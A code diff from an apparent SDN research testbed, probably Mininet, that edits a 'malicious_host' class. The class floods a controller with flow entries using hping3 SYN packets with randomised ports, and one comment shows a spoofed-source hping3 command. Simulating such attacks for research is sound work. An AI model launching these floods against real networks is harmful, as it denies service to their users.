@@ -5,19 +5,13 @@ from datetime import datetime
 from random import randrange, choice, random, randint, uniform
 
 
-# ip can be in the same subnet (means that the first 3 octets are the same)
-# or in different subnet (means that the first 3 octets are different
-# TODO consider which case is better for the attack
-# attack ip needs to be in the SDN since it floods the controller and do not build a flow it is useless
 def ip_generator(number_of_hosts=2):
 
-    ip = ".".join(["10","0","0",str(randrange(1,2))])
+    ip = ".".join(["10","0","0",str(randrange(1, number_of_hosts))])
     return ip
-   
-# attack can be on the different ports in the same IP 
+
 def port_generator():
     return randrange(1024, 65535)
-  
 
 class malicious_host():
   def __init__(self,name, net, idle_timeout) -> None:
@@ -26,17 +20,14 @@ class malicious_host():
     self.idle_timeout = idle_timeout
     self.attacks = []
     
-    
-    
   # This attack is to send a lot of flow entries to the switch in different ports with same IP
   # different dest_port 60
-  def attack_controller_port(self, attack_interval, attack_number , victim_ip):
-    start_time = time.time()
+  def attack_controller_port(self, attack_interval, attack_number , victim_ip, step=10):
     
     count = 0
     idle_timeout = 10
     while( count<attack_number):
-      for i in range(10):
+      for i in range(step):
         choose_port = randint(1,2)
         attack = ''
         if choose_port==1 :  
@@ -50,21 +41,18 @@ class malicious_host():
         self.net.cmd(j)
       count = len(self.attacks)
       sleep(attack_interval)
-    
-    # different source ip
-    # TODO thıs attack needs real Ip addresses from SDN
-    #  
-  def attack_controller_ip(self, attack_interval, attack_number, number_of_hosts=2):
+
+  def attack_controller_ip(self, attack_interval, attack_number, number_of_hosts=2, step=10):
     #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
-    victim_ip = ip_generator(number_of_hosts)
-    start_time = time.time()
+    victim_ip = ip_generator(number_of_hosts) 
     count = 0
     while( count<attack_number):
-      attack_port = randint(80, 65000)
-      for i in range(10):
-        attack = f'hping3 -d 10 -s {attack_port} -p 80 -c 1 {victim_ip}'
+      sleep(attack_interval)
+      for i in range(step):
+        attack_port = randint(80, 65000)
+        attack = f'hping3 -S -d 10 -s {attack_port} -p 80 -c 1 {victim_ip} &'
         self.attacks.append(attack)
       for j in self.attacks:
         self.net.cmd(j)
+        sleep(0.1)
       count = len(self.attacks)
-      sleep(attack_interval)
